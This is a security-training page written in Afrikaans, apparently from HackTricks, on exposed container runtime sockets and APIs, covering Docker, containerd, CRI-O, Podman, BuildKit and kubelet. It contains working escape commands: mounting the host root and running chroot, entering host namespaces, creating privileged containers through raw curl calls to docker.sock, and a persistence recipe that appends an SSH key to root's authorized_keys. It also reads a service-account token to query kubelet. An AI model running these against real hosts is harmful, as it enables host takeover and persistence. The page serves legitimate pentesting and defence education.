# Runtime API- en Daemon-blootstelling

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Baie werklike container-kompromitterings begin glad nie met ’n namespace-ontsnapping nie. Hulle begin met toegang tot die runtime-beheervlak. As ’n workload via ’n gemonteerde Unix-socket of ’n blootgestelde TCP-listener met `dockerd`, `containerd`, CRI-O, Podman of kubelet kan kommunikeer, kan die aanvaller moontlik versoek dat ’n nuwe container met groter voorregte geskep word, die gasheerlêerstelsel gemonteer word, by gasheer-namespaces aansluit of sensitiewe nodusinligting verkry. In sulke gevalle is die runtime-API die werklike sekuriteitsgrens, en om dit te kompromitteer is in die praktyk amper dieselfde as om die gasheer te kompromitteer.

Daarom moet blootstelling van runtime-sockets apart van kernel-beskerming gedokumenteer word. ’n Container met gewone seccomp-, capability- en MAC-beperking kan steeds net een API-oproep van ’n kompromittering van die gasheer af wees as `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemonteer is. Die kernel-isolasie van die huidige container kan presies werk soos bedoel, terwyl die runtime-bestuursvlak steeds heeltemal blootgestel is.

## Daemontoegangsmodelle

Docker Engine stel sy bevoorregte API tradisioneel bloot via die plaaslike Unix-socket by `unix:///var/run/docker.sock`. Histories is dit ook op afstand blootgestel via TCP-listeners soos `tcp://0.0.0.0:2375` of ’n TLS-beskermde listener op `2376`. Om die daemon op afstand bloot te stel sonder sterk TLS en kliënt-verifikasie, verander die Docker API in wese in ’n afgeleë root-koppelvlak.

containerd, CRI-O, Podman en kubelet stel soortgelyke hoë-impak-aanvalsoppervlakke bloot. Die name en werkvloeie verskil, maar die logika nie. As die koppelvlak die oproeper toelaat om workloads te skep, gasheerpaaie te monteer, geloofsbriewe te verkry of lopende containers te verander, is dit ’n bevoorregte bestuurskanaal en moet dit dienooreenkomstig hanteer word.

’n Web-UI vir containerbestuur kan dieselfde grens blootstel sonder om die plaaslike rekening direkte socket-toegang te gee. [Portainer issue #493](https://github.com/portainer/portainer/issues/493) het byvoorbeeld ’n administrateurwagwoordterugstelling sonder verifikasie in ’n ouer 1.11.1-bou gedokumenteer. Beskou ’n plaaslik bereikbare UI slegs as ’n leidraad vir ondersoek: bevestig die geïnstalleerde bou en verifikasiegedrag, die werklike administrateurbeheer en of die bestuurde eindpunt containers met ’n skryfbare gasheer-bind mount kan skep. [Portainer dokumenteer](https://docs.portainer.io/admin/environments/add/docker/socket) dat socket-gesteunde bestuur toegang tot die Docker-socket vereis; ’n rootless of beperkte eindpunt verander die impak op die gasheer. Moenie die verifikasiefout of root-toegang tot die gasheer aflei uit net ’n prosesnaam, poort of weergawe-string nie.

Algemene plaaslike paaie wat die moeite werd is om na te gaan:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Ouer of meer gespesialiseerde stakke kan ook eindpunte soos `dockershim.sock`, `frakti.sock` of `rktlet.sock` blootstel. Dit kom minder dikwels in moderne omgewings voor, maar wanneer jy hulle teëkom, moet jy hulle met dieselfde omsigtigheid hanteer, omdat hulle runtime-beheeroppervlakke verteenwoordig en nie gewone toepassingsokke nie.

## Veilige afstandtoegang

As ’n daemon buite die plaaslike sok blootgestel moet word, moet die verbinding met TLS beskerm word, verkieslik met wedersydse verifikasie sodat die daemon die kliënt verifieer en die kliënt die daemon verifieer. Die ou gebruik om die Docker-daemon gerieflikheidshalwe op gewone HTTP oop te stel, is een van die gevaarlikste foute in container-administrasie, omdat die API-oppervlak sterk genoeg is om bevoorregte containers direk te skep.

Die historiese Docker-konfigurasiem patroon het so gelyk:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Op systemd-gebaseerde gashere kan daemoonkommunikasie ook as `fd://` verskyn, wat beteken dat die proses ’n vooraf oopgemaakte sok vanaf systemd erf eerder as om dit self direk te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Sodra die daemoon buite ’n plaaslike sok met streng toestemmings luister, word transportsekuriteit en kliëntverifikasie noodsaaklik, nie meer opsionele verharding nie.

## Misbruik

As ’n runtime-sok teenwoordig is, bevestig watter een dit is, of ’n versoenbare kliënt bestaan en of rou HTTP- of gRPC-toegang moontlik is:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Hierdie opdragte is nuttig omdat hulle onderskei tussen ’n dooie pad, ’n gemonteerde maar ontoeganklike socket en ’n lewendige bevoorregte API. As die client slaag, is die volgende vraag of die API ’n nuwe container met ’n host bind mount of gedeelde host-namespace kan begin.

### Wanneer Geen Client Geïnstalleer Is Nie

Die afwesigheid van `docker`, `podman` of ’n ander gebruikersvriendelike CLI beteken nie dat die socket veilig is nie. Docker Engine kommunikeer via HTTP oor sy Unix-socket, en Podman stel beide ’n Docker-versoenbare API en ’n Libpod-eie API beskikbaar deur `podman system service`. Dit beteken ’n minimale omgewing met net `curl` kan steeds genoeg wees om die daemon aan te stuur:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Vir PHP-kode-uitvoering wat deur `open_basedir` beperk word, [bly Unix-socket-verbindings ’n afsonderlike roete](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) wanneer die PHP-proses OS-toestemming het om te koppel.

Dit is belangrik tydens post-exploitation, want verdedigers verwyder soms die gewone kliëntbinaries, maar laat die bestuursocket gemonteer. Onthou op Podman-gashere dat die waardevolle pad verskil tussen rootful- en rootless-ontplooiings: `unix:///run/podman/podman.sock` vir rootful-diensinstansies en `unix://$XDG_RUNTIME_DIR/podman/podman.sock` vir rootless-instandies.

### Volledige voorbeeld: Docker-socket na gasheer-root

As `docker.sock` bereikbaar is, is die klassieke ontsnapping om ’n nuwe container te begin wat die gasheer se wortellêerstelsel monteer en dan daarin te `chroot`:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Dit bied direkte uitvoering as host-root via die Docker-daemon. Die impak beperk hom nie tot lêerlees nie. Sodra die aanvaller binne die nuwe container is, kan hy gasheerlêers wysig, credentials oes, persistence inplant of bykomende bevoorregte workloads begin.

### Volledige voorbeeld: Docker Socket na Host Namespaces

As die aanvaller eerder namespace-toegang verkies as toegang wat slegs op die lêerstelsel gebaseer is:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Hierdie pad bereik die host deur die runtime te vra om ’n nuwe container met eksplisiete host-namespace-blootstelling te skep, eerder as om die huidige container uit te buit.

### Docker Socket Persistence Pattern

Runtime-beheer kan ook vir persistence gebruik word, eerder as vir ’n eenmalige shell. Die algemene patroon is om ’n helper-container met ’n host-mount te skep, gemagtigde toegangsmateriaal of ’n startup hook na die gemounte host-lêerstelsel te skryf, en dan te bevestig dat die host dit gebruik.

Voorbeeldstruktuur:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Dieselfde idee kan, afhangend van wat die operateur wil bewys, op systemd-eenhede, cron-brokkies, toepassingbeginlêers of SSH-sleutels gerig word. Die belangrike punt is dat die volgehoue verandering deur die runtime-daemon se lêerstelselbevoegdheid op gasheervlak gemaak word, nie deur ekstra voorregte in die oorspronklike container nie.

### Raw Docker API Helper Pivot

Wanneer die Docker CLI ontbreek, kan dieselfde host-mount-helpervloei via HTTP oor die Unix-sok uitgevoer word. Die algemene vloei is: bevestig die API, skep ’n helper-container met ’n host-bind-mount, begin dit, skep ’n exec-instansie en begin daardie exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Die finale `/exec/<id>/start`-versoek hang af van die teruggestuurde exec-ID, maar die sekuriteitspunt is onafhanklik van die presiese JSON-verbinding: rou API-toegang tot ’n rootful Docker-daemon is genoeg om ’n kragtiger helper-werklading aan te vra.

### Volledige voorbeeld: containerd-socket

’n Gemonteerde `containerd`-socket is gewoonlik net so gevaarlik:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

As ’n meer Docker-agtige kliënt beskikbaar is, kan `nerdctl` geriefliker as `ctr` wees omdat dit bekende vlae soos `--privileged`, `--pid=host` en `-v` bied:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Die impak is weer kompromittering van die host. Selfs al is Docker-spesifieke nutsmiddels afwesig, kan ’n ander runtime-API steeds dieselfde administratiewe mag bied. Op Kubernetes-nodes kan `crictl` ook genoeg wees vir reconnaissance en interaksie met houers, omdat dit direk met die CRI-endpoint kommunikeer.

### BuildKit Socket

`buildkitd` is maklik om mis te kyk omdat mense dit dikwels as “net die bou-agterkant” beskou, maar die daemon is steeds ’n bevoorregte beheervlak. ’n Bereikbare `buildkitd.sock` kan ’n aanvaller toelaat om arbitrêre boustappe uit te voer, worker-vermoëns te inspekteer, plaaslike kontekste uit die gekompromitteerde omgewing te gebruik en gevaarlike entitlements soos `network.host` of `security.insecure` aan te vra wanneer die daemon ingestel is om dit toe te laat.

Nuttige eerste interaksies is:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

As die daemon bouversoeke aanvaar, toets of onveilige entitlements beskikbaar is:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Die presiese impak hang af van die daemon-konfigurasie, maar ’n rootful BuildKit-diens met permissiewe entitlements is nie ’n onskadelike gerief vir ontwikkelaars nie. Behandel dit as nog ’n waardevolle administratiewe aanvalsvlak, veral op CI-runners en gedeelde build-nodes.

### Kubelet-API oor TCP

Die kubelet is nie ’n container runtime nie, maar dit is steeds deel van die nodebestuursvlak en kom dikwels ter sprake in dieselfde vertrouensgrensbespreking. As die kubelet se veilige poort `10250` vanaf die workload bereikbaar is, of as node-geloofsbriewe, kubeconfigs of proxy-regte blootgestel word, kan die aanvaller moontlik Pods opsom, logs ophaal of opdragte uitvoer in node-plaaslike containers sonder om ooit die Kubernetes API-bediener se admission-pad te raak.

Begin met goedkoop verkenning:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

As die kubelet- of API-server-proxypad `exec` magtig, kan ’n WebSocket-bekwame kliënt dit gebruik om kode in ander houers op die node uit te voer. Dit is ook waarom `nodes/proxy` met slegs `get`-toestemming gevaarliker is as wat dit klink: die versoek kan steeds kubelet-eindpunte bereik wat opdragte uitvoer, en daardie direkte kubelet-interaksies verskyn nie in gewone Kubernetes-ouditlogboeke nie.<sup>[[2]](#references)</sup>

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die houer enige bestuursvlak kan bereik wat buite die vertrouensgrens moes gebly het.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Wat hier interessant is:

- ’n Gemonteerde runtime-sok is gewoonlik ’n direkte administratiewe primitief eerder as bloot inligtingsopenbaarmaking.
- ’n TCP-luisteraar op `2375` sonder TLS moet as ’n toestand vir afstandskompromittering beskou word.
- Omgewingsveranderlikes soos `DOCKER_HOST` verklap dikwels dat die workload doelbewus ontwerp is om met die host-runtime te kommunikeer.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Plaaslike Unix-sok by verstek | `dockerd` luister op die plaaslike sok en die daemon is gewoonlik rootful | montering van `/var/run/docker.sock`, blootstelling van `tcp://...:2375`, swak of ontbrekende TLS op `2376` |
| Podman | Daemonless CLI by verstek | Geen langdurige bevoorregte daemon word vir gewone plaaslike gebruik vereis nie; API-sokke kan steeds blootgestel word wanneer `podman system service` geaktiveer is | blootstelling van `podman.sock`, die diens wyd beskikbaar stel, rootful API-gebruik |
| containerd | Plaaslike bevoorregte sok | Administratiewe API blootgestel deur die plaaslike sok en gewoonlik deur hoërvlaknutsgoed gebruik | montering van `containerd.sock`, breë `ctr`- of `nerdctl`-toegang, blootstelling van bevoorregte naamruimtes |
| CRI-O | Plaaslike bevoorregte sok | Die CRI-eindpunt is bedoel vir betroubare komponente op die node | montering van `crio.sock`, blootstelling van die CRI-eindpunt aan onbetroubare workloads |
| Kubernetes kubelet | Node-plaaslike bestuurs-API | Kubelet behoort nie wyd bereikbaar vanaf Pods te wees nie; toegang kan podtoestand, geloofsbriewe en uitvoeringsfunksies blootstel, afhangend van authn/authz | montering van kubelet-sokke of sertifikate, swak kubelet-auth, host-netwerk plus ’n bereikbaar kubelet-eindpunt |



## References

- [1] [containerd-sokuitbuiting deel 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Risiko’s van Kubernetes API Server-omseiling](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
